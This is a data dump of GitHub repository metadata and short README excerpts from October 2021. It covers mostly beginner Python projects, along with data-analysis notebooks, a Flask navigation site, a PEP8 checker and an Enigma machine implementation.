417672294;flask-webstack;https://github.com/windward0071/flask-webstack;;2021-10-16T00:21:32Z;0;0;0;flask-webstack 以webstack为模板，使用python flask编写的易于维护的导航源码，自动采集。 QQ交流群  1. 静态部署 到 https://github.com/WebStackPage/WebStackPage.github.io 将作者写的导航代码 clone 下来。 下载到本地后，删除掉404.html、en文件夹。将cn里面的index.html替换掉根目录的index.html，删除cn文件夹。 上面的步骤是因为我不需要中英文切换，懒。完成后你的目录下应该只剩下assets文件夹和index.html文件。 打开index.html应该能看到如下图所示的初始界面。  注意这里我是在 pycharm 里面拖动文件的，pycharm 会自动调整代码中的文件路径，如果是手动移动的话，需要自行修改，否则会出现静态文件找不到的情况。   你可以自行修改标题，图标等等，这里我修改后的效果是这样的（这里用最终效果的图片）。  2. 使用flask管理 由于不可能每次添加一个导航都要去修改代码和重启程序，所以使用flask来动态管理。不过由于懒得写后台什么的，干脆直接用json文件来当导航的配置文件吧。 左侧导航栏的配置文件格式  右侧导航项的配置文件格式  模板渲染出左侧导航栏，右侧的实现效果类似  3. 总结 当然导航都是采集来的，一个一个去收集的话实在太麻烦了，写个爬虫脚本就搞定。整个项目并没有什么难度，还是要感谢WebStackPage作者提供的导航源码！ 4. Demo 制作完毕，请看风洞网安全导航演示站：aHR0cHMlM0EvL25hdi5iZXdpbmR3YXJkLmNvbS8=  加入风洞网的知识星球获取源码，星球会不定期分享各种网络安全干货知识！  
417729200;SalesAnalysis-Visualization;https://github.com/dikshanasa/SalesAnalysis-Visualization;Jupyter Notebook;2021-10-16T05:36:32Z;0;0;0;Sales Analysis & Visualization  Finding relationships most correlated columns Finding the most busy city, payment type, branch Visualizing a Gender based comparison for different product type Visualizing a City based comparison for different product type Finding which payment method is used more often at a particular city, branch and for which product type Finding which branch has a better sale for which product  Steps for analysis : Data Exploration and Cleaning Exploratory Data Analysis  Observations  The best correlated are Tax 5%, Total, Gross Income and cogs i.e Cost of Goods sold with a correlation of 1.  Mean rating is 7.  Branch A is the busiest branch.  E-Wallet is the most popular method of payment.  Yangon is the busiest city.  There are more female customers than men.  Popular category of products among females:   - Fashion accessories    - Food & beverages   - Sports & Travel   Popular category of products among males :  - Health & Beauty    - Electronic Accesories   - Home and Lifestyle  Yangon leads at Home & Lifestyle and Electronic accessories.  Naypyitaw leads at Food & Bevaerages and Fashion accessories.  Mandalay leads at Sports & Travel and Health & Beauty. 
417746492;KNN-Regression-and-Classification;https://github.com/dineshtpalanisamy/KNN-Regression-and-Classification;Jupyter Notebook;2021-10-16T06:58:15Z;0;0;0;KNN-Regression-and-Classification In this notebook I have used KNN regression and Classification on a dataset and improved the performance by tuning the hyperparameters and further improved using Bagging and Boosting using python scikit and sklearn libraries 
417738383;Complete-Guide-to-Data-Visualization;https://github.com/abdullah2297/Complete-Guide-to-Data-Visualization;HTML;2021-10-16T06:22:08Z;0;0;0;Complete-Guide-to-Data-Visualization The main libraries for data visualization with Python and all the types of charts that can be done with them. We will also see which library is recommended to use on each occasion and the unique capabilities of each library. Prerequisites - Jupyter Notebook - Python 3 - Python libraries: Numpy, Pandas, Matplotlib, Seaborn, Plotly  Installing  Instructions to install Jupyter Notebook: https://jupyter.org/install  
417721984;linuxFileSizeMeter;https://github.com/mc5368/linuxFileSizeMeter;Python;2021-10-16T05:02:49Z;0;0;0;
417725674;child-mortality-brazil-kaggle;https://github.com/daniellealmeidagms/child-mortality-brazil-kaggle;Jupyter Notebook;2021-10-16T05:20:40Z;0;0;0;child-mortality-brazil-kaggle Predição da probabilidade de óbito de um bebê a partir de dados da mãe, do pré-natal e do parto. Os conjuntos de dados utiizados neste trabalho são referentes a óbitos de crianças no Brasil e estão disponíveis na plataforma Kaggle. Foram avaliados cinco modelos de classificação disponíveis na biblioteca Scikit-Learn:  Regressão Logística (Logistic Regression) Árvores de Decisão (Decision Trees) K-Vizinhos Próximos (K-Nearest Neighbors) Gaussian Naive Bayes Máquinas de Vetores de Suporte (Support Vector Machines)  Os modelos acima foram associados a três diferentes técnicas de subamostragem:  Random Undersampler NearMiss One Sided Selection  O modelo baseado em Naive Bayes obteve melhor desempenho médio em treino com a estratégia de validação cruzada K-Fold, associado à tecnica Random Undersampling. Após o ajuste de hiperparâmetros, a acurácia do modelo foi de 91% no conjunto de teste.  Prediction of the probability of a baby's death based on mother, prenatal and delivery data. Five classification models available in the Scikit-Learn library were evaluated:  Logistic Regression Decision Trees K-Nearest Neighbors Gaussian Naive Bayes Support Vector Machines  The models above were associated with three different undersampling techniques:  Random Undersampler NearMiss One Sided Selection  The model based on Naive Bayes obtained the best average performance in training with the K-Fold cross validation strategy, associated with the Random Undersampling technique. After adjusting the hyperparameters, the model accuracy was 91% in the test set.  Projeto desenvolvido para o segundo módulo do curso de Especialização em Inteligência Artifical Aplicada, semestre 2021/2, do Instituto Federal de Goiás - Câmpus Goiânia. 
417726119;distributed_iot_app_deployment_platform;https://github.com/ronitray95/distributed_iot_app_deployment_platform;Python;2021-10-16T05:23:15Z;0;0;0;"Team individual codes  All team specific codes are kept in individual folders platform folder contains the main platform code. Bootstrap for Mac osascript -e 'tell application ""Terminal"" to do script ""init.sh""'  "
417672367;RandomNumberGuesser;https://github.com/Grantlee11/RandomNumberGuesser;Python;2021-10-16T00:22:04Z;0;0;0;RandomNumberGuesser This is a random number guesser I developed in Python, it presents the user with three seperate options for playing. Option 1 allows the user to keep guessing by themselves. Option 2 allows the user to watch the CPU make guesses. Option 3 allows the User and CPU to race to guess the correct number first. The code runs well for the most part, but there is some breakdown with the algorithm in option 3 that'll I'll fix at a future date. I'd like to speed up the CPU guessing, by making it account for the User's most recent guess, and I'd like to stop the algorithms breakdown when closing in on the correct value. I'll also need to install some form of exception hjandling in the future. 
417859701;modulo_python;https://github.com/qaml-bootcamp-python-oct2021/modulo_python;;2021-10-16T14:55:22Z;0;0;2;modulo_python Este repositorio pertenece al modulo de Python del bootcamp de Octubre 2021 Instructor David Gonzalez Participantes Brenda Montiel Berenice Rosquero Tony De La Torre Marcelo Equise Yuridia Kleiman Ivan de la FuenteS Mariela Gutierrez Salvador Sandoval Juan Luis Larios Yami Gutierrez T 
417846173;rockpaper-in-python;https://github.com/Prasan26/rockpaper-in-python;Python;2021-10-16T14:07:44Z;0;0;1;rockpaper-in-python 
417804128;python-projects-for-beginner;https://github.com/AsmitaKumari-tech/python-projects-for-beginner;Python;2021-10-16T11:14:04Z;0;0;2;python-projects-for-beginner 
417876844;Python;https://github.com/The-Prithvi/Python;;2021-10-16T16:00:36Z;0;0;0;
417787279;python;https://github.com/Liangyueeee/python;Python;2021-10-16T10:00:33Z;0;0;0;
417805024;Python;https://github.com/KarthickPandiyan/Python;;2021-10-16T11:17:56Z;0;0;0;
417793068;Python;https://github.com/Sokudo-TM/Python;Python;2021-10-16T10:24:38Z;0;0;0;
417849575;Python;https://github.com/Glepa/Python;Python;2021-10-16T14:19:09Z;0;0;0;
417788531;Python;https://github.com/Vanessa-kriby/Python;Vue;2021-10-16T10:04:52Z;0;0;0;Python Author:Eternity Intent: Share some code I wrote myself at university 
417848371;python;https://github.com/franciscoalmado/python;Python;2021-10-16T14:15:23Z;0;0;0;
417824723;Python;https://github.com/tom-costa/Python;Python;2021-10-16T12:41:34Z;0;0;0;
417855166;python;https://github.com/kanchana26/python;;2021-10-16T14:38:35Z;0;0;0;
417815952;Python;https://github.com/adomiraru/Python;;2021-10-16T12:04:51Z;0;0;0;Anything is fine except to make it look like you made it This was made in Jupyter Notebook to display the quadratic function randomly 
417801922;python;https://github.com/1404592281/python;;2021-10-16T11:04:16Z;0;0;0;
417839510;python;https://github.com/bouakilayman/python;Jupyter Notebook;2021-10-16T13:41:02Z;0;0;0;
417793238;python;https://github.com/mdjames094/python;;2021-10-16T10:25:24Z;0;0;0;python Testing and training 
417833417;python;https://github.com/anupamjain16/python;;2021-10-16T13:15:57Z;0;0;0;python 
417831258;python;https://github.com/yubibubi/python;Python;2021-10-16T13:07:49Z;0;0;0;python 
417842831;python;https://github.com/joshikanchana26/python;;2021-10-16T13:55:08Z;0;0;0;
417774367;python;https://github.com/Gwend449/python;;2021-10-16T09:05:12Z;0;0;0;
417762244;python;https://github.com/vab-developer/python;Python;2021-10-16T08:08:56Z;0;0;0;
417804031;python;https://github.com/atraxsrc/python;Python;2021-10-16T11:13:36Z;0;0;0;
417804708;python;https://github.com/scriptden/python;Python;2021-10-16T11:16:39Z;0;0;0;python my way of learning 
417826930;Python;https://github.com/ajithb073/Python;Python;2021-10-16T12:50:25Z;0;0;0;Python Python basic coding examples 
417842426;Python;https://github.com/eovsyannikova/Python;;2021-10-16T13:53:31Z;0;0;0;Python 
417843226;Python;https://github.com/Navatha0922/Python;;2021-10-16T13:56:44Z;0;0;0;Python 
417778179;Python;https://github.com/TARasti/Python;Python;2021-10-16T09:22:26Z;0;0;0;
417806562;python;https://github.com/Valentez/python;;2021-10-16T11:24:45Z;0;0;0;1 
417868664;python;https://github.com/mahajanvm/python;;2021-10-16T15:28:21Z;0;0;0;
417769137;python;https://github.com/ThisathRanasinghe/python;;2021-10-16T08:42:01Z;0;0;0;python 
417768083;python-logging-library;https://github.com/latonaio/python-logging-library;Python;2021-10-16T08:36:30Z;2;2;0;"python-logging-library python-logging-library は Pythonランタイム の マイクロサービス の ログ を出力する際に、ログのjsonフォーマットを統一するためのPythonライブラリです。 動作環境 動作には以下の環境であることを前提とします。 ・OS: Linux OS ・CPU: ARM/AMD/Intel ・Kubernetes ・AION のリソース 利用方法 本リポジトリをインストールしてください。 pip install ""git+ssh://git@github.com/latonaio/python-logging-library.git@develop#egg=custom_logger"" 各マイクロサービスのソース内に以下を配置してください。 from custom_logger import init_logger init_logger() "
417797325;Data-warehouse-and-mining;https://github.com/Vish14-eng/Data-warehouse-and-mining;Jupyter Notebook;2021-10-16T10:45:04Z;3;3;2;Data-warehouse-and-mining DWM algorithm implementation using python 
417796400;PythonScripts;https://github.com/Sheep-Hunter/PythonScripts;;2021-10-16T10:40:31Z;0;0;0;PythonScripts An array of python scripts 
417798283;PythonExamples;https://github.com/Kirizaki/PythonExamples;;2021-10-16T10:49:35Z;0;0;0;Readme template file.. 
417833623;pythonWeb;https://github.com/NYP-RoboticsSG/pythonWeb;;2021-10-16T13:16:50Z;0;0;0;
417805699;python2021;https://github.com/maksimkharlovdev/python2021;Python;2021-10-16T11:21:04Z;0;0;0;python2021 Python tasks 
417797071;PythonCourse;https://github.com/RukunMi/PythonCourse;;2021-10-16T10:43:54Z;0;0;0;
417784871;PythonExercises;https://github.com/mSzynalik/PythonExercises;;2021-10-16T09:50:38Z;0;0;0;
417813836;Python01;https://github.com/qgzm/Python01;Python;2021-10-16T11:56:18Z;0;0;0;Python01 Python文件 
417799672;PythonLearn;https://github.com/XinYu73/PythonLearn;Python;2021-10-16T10:55:33Z;0;0;0;
417859923;pythonExample;https://github.com/HemantaPatil/pythonExample;HTML;2021-10-16T14:56:10Z;0;0;0;
417855252;PythonProgramming;https://github.com/University-Assignment/PythonProgramming;;2021-10-16T14:38:54Z;0;0;0;PythonProgramming 
417790127;python001;https://github.com/Liangyueeee/python001;Python;2021-10-16T10:11:00Z;0;0;0;
417791814;pythonProject;https://github.com/hayagou/pythonProject;Python;2021-10-16T10:18:42Z;0;0;0;
417862469;pythonProject;https://github.com/sherlocklock666/pythonProject;;2021-10-16T15:05:21Z;0;0;0;
417837182;PythonDB;https://github.com/AntoryuLimyh/PythonDB;Python;2021-10-16T13:31:26Z;0;0;0;"Python - Create SQL DB and link it to Alpaca API for US stock symbol and its associated price API Alpaca API https://alpaca.markets/ To check the respective symbol and its associated price via the SQL Command FROM stock_price P  INNER JOIN stock S on P.stock_id = S.id WHERE S.symbol = 'FB' ORDER BY P.date; ```    "
417836760;PythonPractice;https://github.com/nonsiganl007/PythonPractice;;2021-10-16T13:29:53Z;0;0;0;
417812242;Python01;https://github.com/DS-Shahina/Python01;Python;2021-10-16T11:49:15Z;0;0;0;
417777413;pythonPrac;https://github.com/Syouya0828/pythonPrac;;2021-10-16T09:19:10Z;0;0;0;pythonPrac 
417869290;PythonRepo;https://github.com/StandinNeon/PythonRepo;Python;2021-10-16T15:30:41Z;0;0;0;
417861683;pythonPrograms;https://github.com/Ranjanunicode/pythonPrograms;Python;2021-10-16T15:02:37Z;0;0;0;pythonPrograms Python gui program using Turtle module Simply run the code using Idle or Vs code or Pycharm it gives beautiful graphics forming our Indian National flag. 
417838859;pythonProject;https://github.com/martakurowska/pythonProject;Python;2021-10-16T13:38:13Z;0;0;0;
417776318;pythonBot;https://github.com/SaadAliHafiz/pythonBot;Python;2021-10-16T09:13:49Z;0;0;0;
417841561;pythonLessons;https://github.com/kamelzhan/pythonLessons;Python;2021-10-16T13:49:36Z;0;0;0;pythonLessons 
417876628;pythonLAB;https://github.com/karicancino/pythonLAB;;2021-10-16T15:59:47Z;1;1;0;
417809876;pythonProject;https://github.com/projectmemoi/pythonProject;Python;2021-10-16T11:39:25Z;0;0;0;
417790933;push-it-hacktoberfest;https://github.com/Muhammad-Bilal-MB/push-it-hacktoberfest;CSS;2021-10-16T10:14:47Z;1;1;5;push-it-hacktoberfest This repository is totally dedicated to Hacktoberfest 2021, feel free to add your project.  HacktoberFest21 Hello Hackers, Contributors! HacktoberFest has begun again for year 2021, and everyone's excited to get started! Contribute between: 1 OCTOBER - 31 OCTOBER Create a Pull request and add any feature update to the repository.  Click here to register for hacktoberfest2021.  How to contribute to this project? Here are 2 quick and painless ways to contribute to this project:  Add your source file of Python, C++, Java, html, C# or any other language program in respective directory. Add your details following template of Contributors.md file in Contributors folder. Make a new .md file with your name. (Follow the template and don't remove any brackets from the template). Choose both, make a pull request for your work and wait for it to be merged!!  Getting started  Fork this repository (Click the Fork button on the top right of this page, click your Profile Image) Clone your forked down repository to your local machine.  git clone https://github.com/yourusername/push-it-hacktoberfest   Create a branch  git checkout -b your-branch-name   Make your changes. Commit and push your code.  git add . git commit -m 'Commit message' git push origin branch-name   Create a new pull request from your forked repository (Click the New Pull Request button located at the top of your repo) Wait for your PR review and merge approval... Star this repository if you had fun contributing!  
417824887;PythonOtomatikBilgisayarKapatma;https://github.com/FurkanAcarsan70/PythonOtomatikBilgisayarKapatma;Python;2021-10-16T12:42:20Z;0;0;0;
417837877;PythonPY1001;https://github.com/fixtik/PythonPY1001;Python;2021-10-16T13:34:19Z;0;0;0;
417792769;PythonPY100;https://github.com/Jane1930/PythonPY100;Python;2021-10-16T10:23:08Z;0;0;0;
417792613;PythonPY100;https://github.com/Kirillvv9/PythonPY100;Python;2021-10-16T10:22:30Z;0;0;0;
417792748;PythonPY100;https://github.com/glebcher/PythonPY100;Python;2021-10-16T10:23:03Z;0;0;0;
417794000;PythonPY100;https://github.com/catDaVinchi/PythonPY100;Python;2021-10-16T10:29:13Z;0;0;0;
417866449;PythonTutorialCode;https://github.com/conliffe/PythonTutorialCode;Python;2021-10-16T15:19:52Z;0;0;0;PythonTutorialCode This is for test code that I create using Atom 
417783748;pythonProject9;https://github.com/aleuli/pythonProject9;;2021-10-16T09:46:05Z;0;0;0;
417796591;pythonProject5;https://github.com/TheSindbad/pythonProject5;;2021-10-16T10:41:39Z;1;1;0;
417816109;PythonYoutubeVideoDownloader;https://github.com/ihussainhaider/PythonYoutubeVideoDownloader;Python;2021-10-16T12:05:29Z;0;0;0;PythonYoutubeVideoDownloader This is Python Pytube and Tkinter GUI based Youtube video downloader. 
417838143;PythonGenerateNodeSQL;https://github.com/laoappsdev6/PythonGenerateNodeSQL;Python;2021-10-16T13:35:22Z;0;0;0;PythonGenerateNodeSQL 
417823422;PythonCodingTest;https://github.com/iruyj/PythonCodingTest;Python;2021-10-16T12:36:16Z;0;0;0;
417864640;pythonProject_Otus;https://github.com/Yumef/pythonProject_Otus;;2021-10-16T15:13:14Z;0;0;0;"""# pythonProject_Otus"" "
417823836;PythonCodeAnalyser;https://github.com/cau777/PythonCodeAnalyser;Python;2021-10-16T12:37:56Z;0;0;0;PythonCodeAnalyser A simple tool that finds common stylistic issues in Python code according to PEP8. It uses Abstract Syntax Tree and Regular Expressions Inspections  S001 - Line too long (contains more than 79 characters) S002 - Indentation is not a multiple of four S003 - Unnecessary semicolon after a statement S004 - Less than two spaces before inline comments S005 - TODO found (in comments only and case-insensitive) S006 - More than two blank lines preceding a code line S007 - Too many spaces after class/def S008 - Class name should be written in CamelCase S009 - Function name should be written in snake_case S010 - Argument name should be written in snake_case S011 - Variable should be written in snake_case (only applies to the ones defined in functions bodies) S012 - Default argument value is mutable  Usage You should specify the path to a file or directory in the command line. In case a directory is specified, the program will analyse all python files in the directory and subdirectories. python code_analyzer.py directory-or-file  Examples > python code_analyzer.py /path/to/file/script.py /path/to/file/script.py: Line 1: S004 At least two spaces required before inline comments /path/to/file/script.py: Line 2: S003 Unnecessary semicolon /path/to/file/script.py: Line 3: S001 Too long line /path/to/file/script.py: Line 3: S003 Unnecessary semicolon /path/to/file/script.py: Line 6: S001 Too long line /path/to/file/script.py: Line 11: S006 More than two blank lines used before this line /path/to/file/script.py: Line 13: S003 Unnecessary semicolon /path/to/file/script.py: Line 13: S004 At least two spaces required before inline comments /path/to/file/script.py: Line 13: S005 TODO found  > python code_analyzer.py /path/to/project /path/to/project/__init__.py: Line 1: S001 Too long line /path/to/project/script1.py: Line 1: S004 At least two spaces required before inline comments /path/to/project/script1.py: Line 2: S003 Unnecessary semicolon /path/to/project/script2.py: Line 1: S004 At least two spaces required before inline comments /path/to/project/script2.py: Line 3: S001 Too long line /path/to/project/somedir/script.py: Line 3: S001 Too long line /path/to/project/test.py: Line 3: Line 13: S003 Unnecessary semicolon  
417846291;PythonBasicTutorial;https://github.com/Kon-rad-Ch/PythonBasicTutorial;Python;2021-10-16T14:08:03Z;0;0;0;PythonBasicTutorial Just basics training 
417866125;pythonQuizGame;https://github.com/salcedogg/pythonQuizGame;Python;2021-10-16T15:18:37Z;0;0;0;pythonQuizGame a quiz game written in Python 
417864856;-PycharmProjects-pythonProject;https://github.com/jatsada2021/-PycharmProjects-pythonProject;Python;2021-10-16T15:14:01Z;0;0;0;-PycharmProjects-pythonProject 
417806753;python-;https://github.com/rathoreshweta137/python-;Python;2021-10-16T11:25:39Z;0;0;0;
417760781;-Python;https://github.com/Arinamyrza/-Python;;2021-10-16T08:03:00Z;0;0;0;-Python 
417764445;pythonProject_on_motion_detection1;https://github.com/Rachith7/pythonProject_on_motion_detection1;Python;2021-10-16T08:18:53Z;0;0;0;
417801893;Image_steganography_project_using_python3;https://github.com/RakeshYadavCoder/Image_steganography_project_using_python3;;2021-10-16T11:04:10Z;0;0;0;
417793026;PythonPY100_fall-2021-9_3;https://github.com/AlenaLu/PythonPY100_fall-2021-9_3;Python;2021-10-16T10:24:26Z;0;0;0;
417770304;pythonmoves;https://github.com/RaviShankekar/pythonmoves;;2021-10-16T08:47:29Z;0;0;0;
417821699;pythondevelopment;https://github.com/VrushabhKala/pythondevelopment;;2021-10-16T12:29:22Z;0;0;0;
417792105;pythonshapes;https://github.com/cherogonygilbert/pythonshapes;Python;2021-10-16T10:20:06Z;0;0;0;pythonshapes 
417813329;Sketch_dataset;https://github.com/huangdaichui/Sketch_dataset;;2021-10-16T11:53:56Z;0;0;0;Sketch_dataset Our data will open source as soon as possible. 
417830308;python_learn;https://github.com/ssecca/python_learn;;2021-10-16T13:03:46Z;0;0;0;
417763647;-MTUCI-_Python;https://github.com/lsemenov/-MTUCI-_Python;Jupyter Notebook;2021-10-16T08:15:11Z;0;0;0;-MTUCI-_Python Решение заданий Python 
417767765;python-helper;https://github.com/G4rr/python-helper;;2021-10-16T08:35:00Z;0;0;0;
417847012;exercicioemPython;https://github.com/Lya-Lima/exercicioemPython;Python;2021-10-16T14:10:38Z;0;0;0;exercicioemPython 
417810056;Python-Learning;https://github.com/Nick-Riddle/Python-Learning;Python;2021-10-16T11:40:10Z;0;0;0;Python-Learning Python learning. 
417769619;Python_learn;https://github.com/BabyMuu/Python_learn;Python;2021-10-16T08:44:29Z;0;0;0;
417839034;python_dsa;https://github.com/Sahil3554/python_dsa;Python;2021-10-16T13:38:53Z;0;0;0;python_dsa DSA Using Python Searching Linear Search Binary Search 
417824656;Learn_python;https://github.com/selong1234/Learn_python;;2021-10-16T12:41:16Z;0;0;0;Learn_python 记录python练习程序 Day1 
417793251;python-study;https://github.com/Liangyueeee/python-study;Python;2021-10-16T10:25:30Z;0;0;0;
417799985;Python_2;https://github.com/ValentinaSoldatova/Python_2;;2021-10-16T10:56:58Z;0;0;0;
417831118;python-basics;https://github.com/luisgonzalezperea/python-basics;;2021-10-16T13:07:11Z;0;0;0;python-basics 
417783491;Python-Practice;https://github.com/hyq217/Python-Practice;;2021-10-16T09:44:58Z;0;0;0;
417837809;HostingPython;https://github.com/sabujgolder/HostingPython;Python;2021-10-16T13:34:03Z;0;0;0;
417840643;learn-python;https://github.com/roninsswang/learn-python;;2021-10-16T13:45:44Z;0;0;0;learn-python study python code 
417828049;python-cloak;https://github.com/TimRayX/python-cloak;Python;2021-10-16T12:54:57Z;0;0;0;
417762437;Python_Reference;https://github.com/DineshKumaranOfficial/Python_Reference;Python;2021-10-16T08:09:44Z;0;0;0;Python_Reference Here I have the python files that I created while learning Python. 
417799518;python_chalenges;https://github.com/Decripter/python_chalenges;Python;2021-10-16T10:55:01Z;0;0;0;python_chalenges Aqui vou colocar algumas soluções de desafios que resolvi 
417810560;Scholl-python;https://github.com/Zyxuss/Scholl-python;;2021-10-16T11:42:32Z;0;0;0;
417857360;python_lesson;https://github.com/master9robot/python_lesson;;2021-10-16T14:46:43Z;0;0;0;python_lesson my python level 
417859283;python_hacktober;https://github.com/nsriramya/python_hacktober;;2021-10-16T14:53:49Z;0;0;0;python_hacktober 
417861962;learn-python;https://github.com/ryan-mf-eloy/learn-python;;2021-10-16T15:03:29Z;0;0;0;
417848158;caras_python;https://github.com/mariorht/caras_python;Jupyter Notebook;2021-10-16T14:14:42Z;0;0;0;A partir de fotos de caras busca los ojos y genera un video en el cada cara es un frame y los ojos están alineados 
417843215;PruebaPython;https://github.com/GyRG/PruebaPython;Python;2021-10-16T13:56:43Z;0;0;0;PruebaPython Es el repositorio prueba para el curso de certificación del IECA 
417836869;python-enigma;https://github.com/djgoldsmith/python-enigma;Python;2021-10-16T13:30:21Z;0;0;0;Implementation of the Enigma in Python NOTES on Positions: A  B  C  D  E  F  G  H  I  J  K  L  M 0  1  2  3  4  5  6  7  8  9 10 11 12 N  O  P  Q  R  S  T  U  V  W  X  Y  Z 13 14 15 16 17 18 19 20 21 22 23 24 25 A == 65 Z == 90 a == 97 NOTES on Settings Wheel 	ABCDEFGHIJKLMNOPQRSTUVWXYZ 	Notch 	Turnover 	# ETW 	ABCDEFGHIJKLMNOPQRSTUVWXYZ I 	    EKMFLGDQVZNTOWYHXUSPAIBRCJ 	Y 	Q 	1 II 	    AJDKSIRUXBLHWTMCQGZNPYFVOE 	M 	E 	1 III 	BDFHJLCPRTXVZNYEIWGAKMUSQO 	D 	V 	1 IV 	    ESOVPZJAYQUIRHXLNFTGKDCMWB 	R 	J 	1 V 	    VZBRGITYUPSDNHLXAWMJQOFECK 	H 	Z 	1 UKW-A 	EJMZALYXVBWFCRQUONTSPIKHGD UKW-B 	YRUHQSLDPXNGOKMIEBFZCWVJAT UKW-C 	FVPJIAOYEDRZXWGCTKUQSBNMHL Turn Over As we step from Q-> R At Bletchley Park the letters R, F, W, K, A were impressed on the cryptanalysts' minds by the mnemonic: Royal Flags Wave Kings Above. or 17, 5, 22, 10, 0 Tables See Tmp Tab for COnstryctuib | Index | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18 | 19 | 20 | 21 | 22 | 23 | 24 | 25 |    INPUT A B C D E F G H I J K L M N O P Q R S T U V W X Y Z     I E K M F L G D Q V Z N T O W Y H X U S P A I B R C J   II A J D K S I R U X B L H W T M C Q G Z N P Y F V O E   III B D F H J L C P R T X V Z N Y E I W G A K M U S Q O   IV E S O V P Z J A Y Q U I R H X L N F T G K D C M W B   V V Z B R G I T Y U P S D N H L X A W M J Q O F E C K   UKW-A E J M Z A L Y X V B W F C R Q U O N T S P I K H G D   UKW-B Y R U H Q S L D P X N G O K M I E B F Z C W V J A T   UKW-C F V P J I A O Y E D R Z X W G C T K U Q S B N M H L    | INPUT | A  | B  | C  | D  | E  | F  | G  | H  | I  | J  | K  | L  | M  | N  | O  | P  | Q  | R  | S  | T  | U  | V  | W  | X  | Y  | Z  |    INPUT 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25     I 4 10 12 5 11 6 3 16 21 25 13 19 14 22 24 7 23 20 18 15 0 8 1 17 2 9   II 0 9 3 10 18 8 17 20 23 1 11 7 22 19 12 2 16 6 25 13 15 24 5 21 14 4   III 1 3 5 7 9 11 2 15 17 19 23 21 25 13 24 4 8 22 6 0 10 12 20 18 16 14   IV 4 18 14 21 15 25 9 0 24 16 20 8 17 7 23 11 13 5 19 6 10 3 2 12 22 1   V 21 25 1 17 6 8 19 24 20 15 18 3 13 7 11 23 0 22 12 9 16 14 5 4 2 10   UKW-A 4 9 12 25 0 11 24 23 21 1 22 5 2 17 16 20 14 13 19 18 15 8 10 7 6 3   UKW-B 24 17 20 7 16 18 11 3 15 23 13 6 14 10 12 8 4 1 5 25 2 22 21 9 0 19   UKW-C 5 21 15 9 8 0 14 24 4 3 17 25 23 22 6 2 19 10 20 16 18 1 13 12 7 11    And as CSV |I|[4,10,12,5,11,6,3,16,21,25,13,19,14,22,24,7,23,20,18,15,0,8,1,17,2,9] |II|[0,9,3,10,18,8,17,20,23,1,11,7,22,19,12,2,16,6,25,13,15,24,5,21,14,4] |III|[1,3,5,7,9,11,2,15,17,19,23,21,25,13,24,4,8,22,6,0,10,12,20,18,16,14] |IV|[4,18,14,21,15,25,9,0,24,16,20,8,17,7,23,11,13,5,19,6,10,3,2,12,22,1] |V|[21,25,1,17,6,8,19,24,20,15,18,3,13,7,11,23,0,22,12,9,16,14,5,4,2,10] |UKW-A|[4,9,12,25,0,11,24,23,21,1,22,5,2,17,16,20,14,13,19,18,15,8,10,7,6,3] |UKW-B|[24,17,20,7,16,18,11,3,15,23,13,6,14,10,12,8,4,1,5,25,2,22,21,9,0,19] |UKW-C|[5,21,15,9,8,0,14,24,4,3,17,25,23,22,6,2,19,10,20,16,18,1,13,12,7,11] | A | B  | C  | D | E  | F | G | H  | I  | J  | K  | L  | M  | N  | O  | P  | Q  | R  | S  | T  | U  | V  | W  | X  | Y  | Z  | | 0 | 1  | 2  | 3 | 4  | 5 | 6 | 7  | 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18 | 19 | 20 | 21 | 22 | 23 | 24 | 25 | | E | K  | M  | F | L  | G | D | Q  | V  | Z  | N  | T  | O  | W  | Y  | H  | X  | U  | S  | P  | A  | I  | B  | R  | C  | J  | | 4 | 10 | 12 | 5 | 11 | 6 | 3 | 16 | 21 | 25 | 13 | 19 | 14 | 22 | 24 | 7  | 23 | 20 | 18 | 15 | 0  | 8  | 1  | 17 | 2  | 9  | TOny's Message The Enigma configuration for that day was: IV II V | GMY | DN GR IS KC QX TM PV HY FW BJ | and here is the intercepted message: U8K DE C 1806 = 49 = DHO GXS = NQVLT YQFSE WWGJZ GQHVS EIXIM YKCNW IEBMB ATPPZ TDVCU PKAY- A | B | C | D | E | F | G | H | I | J | K | L | M | N | O | P | Q | R | S | T | U | V | W | X | Y | Z | E | K | M | F | L | G | D | Q | V | Z | N | T | O | W | Y | H | X | U | S | P | A | I | B | R | C | J | Thinking about Rotor Shifts Lets imagine a Simple System, With Numbers rather than Letters Also Lets have them all just map to where they are    Index 0 1 2 3 4     Input 0 1 2 3 4   R1 0 1 2 3 4   R2 0 1 2 3 4    So Here it is easy, regardless of the input, The Index is what it should be However lets shift Rotor 1 by One Place    Index 0 1 2 3 4     Input 0 1 2 3 4   R1 1 2 3 4 0   R2 0 1 2 3 4    Now, with an input of 0 We actually connect to the Index 1 of the Reflector Thus Output = [input+offset] However, The Input to the Next rotor is Actually That - the Offset. IE Whatever 1 Outputs, Is now connected to the input pin at position 0 Adding A Reflector    Index 0 1 2 3 4     Input 0 1 2 3 4   R1 0 1 2 3 4   R2 0 1 2 3 4   --------- --- --- --- --- ---   REF IN 0 1 2 3 4   REF OUT 4 3 2 1 0   --------- --- --- --- --- ---   R2 0 1 2 3 4   R1 0 1 2 3 4    So without shifts our input of 0 travels through the rotors, No changes, Hits The Reflector, and is mirrored to return as the opposite number    Index 0 1 2 3 4     Input 0 1 2 3 4    v    ^   R1 0 1 2 3 4    v    ^   R2 0 1 2 3 4    v    ^   --------- --- --- --- --- ---   REF IN 0 1 2 3 4   REF OUT 4 3 2 1 0   --------- --- --- --- --- ---    
417832591;TGIF_python;https://github.com/Jokeropo/TGIF_python;;2021-10-16T13:13:03Z;0;0;0;TGIF_python repository sample just some words added 11 
417785973;introduce-python;https://github.com/Eunwolf/introduce-python;Python;2021-10-16T09:55:19Z;0;0;0;introduce-python 
417871477;python-scripts;https://github.com/nitinkumar30/python-scripts;Python;2021-10-16T15:38:57Z;0;0;0;Python Scripts    Sl No. Topic Link     01 Steganography repo here   02 Notepad repo here   03 Phone number info repo here   04 Open multiple links repo here    
417807649;R-Python;https://github.com/R-Lingo/R-Python;Python;2021-10-16T11:29:23Z;0;0;0;
417782706;Python-Course;https://github.com/ali-raoofi/Python-Course;Python;2021-10-16T09:41:35Z;0;0;0;
417790748;Bot-Python;https://github.com/Xemnu/Bot-Python;Python;2021-10-16T10:13:52Z;0;0;0;Bluppy 
